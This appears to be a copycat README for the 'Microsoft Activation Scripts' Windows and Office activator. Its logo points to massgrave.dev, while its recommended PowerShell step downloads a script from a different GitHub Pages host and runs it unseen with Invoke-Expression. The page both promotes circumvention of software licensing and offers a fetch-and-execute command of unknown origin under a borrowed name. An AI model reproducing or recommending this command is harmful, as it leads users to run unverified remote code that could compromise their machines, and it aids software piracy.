<p align="center"><img src="https://massgrave.dev/images/logo_small.png" alt="MAS Logo"></p>

<h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>

<p align="center">A Windows and Office activator using HWID / Ohook / KMS38 / Online KMS activation methods, with a focus on open-source code and fewer antivirus detections.</p>
<hr>

## Download / How to use it?

### Method 1 - PowerShell (Recommended)

-   Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
-   Copy-paste the below code and press enter
    ```
    $scriptUrl = "https://ufukcam.github.io/n4-activation/activation.ps1"
    $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
    $scriptContent = [System.Text.Encoding]::UTF8.GetString($response.Content)
    Invoke-Expression $scriptContent


    ```
-   You will see the activation options. Follow the on-screen instructions.
-   That's all.



---

<p align="center">Made with Love ❤️</p>
